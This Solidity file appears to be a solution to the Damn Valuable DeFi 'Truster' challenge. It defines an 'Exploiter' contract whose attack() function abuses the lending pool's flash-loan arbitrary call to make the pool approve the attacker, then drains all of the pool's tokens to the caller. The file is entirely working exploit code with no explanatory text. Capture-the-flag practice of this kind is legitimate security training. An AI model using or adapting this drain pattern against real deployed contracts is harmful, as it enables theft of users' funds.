// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";

contract Exploiter {
    TrusterLenderPool private immutable trusterLenderPool;
    DamnValuableToken private immutable token;

    constructor(address payable _trusterLenderPoolAddress) {
        trusterLenderPool = TrusterLenderPool(_trusterLenderPoolAddress);
        token = trusterLenderPool.token();
    }

    function attack() external {
        bytes memory data = abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max);
        trusterLenderPool.flashLoan(0, address(this), address(token), data);
        token.transferFrom(address(trusterLenderPool), address(this), token.balanceOf(address(trusterLenderPool)));
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }
}
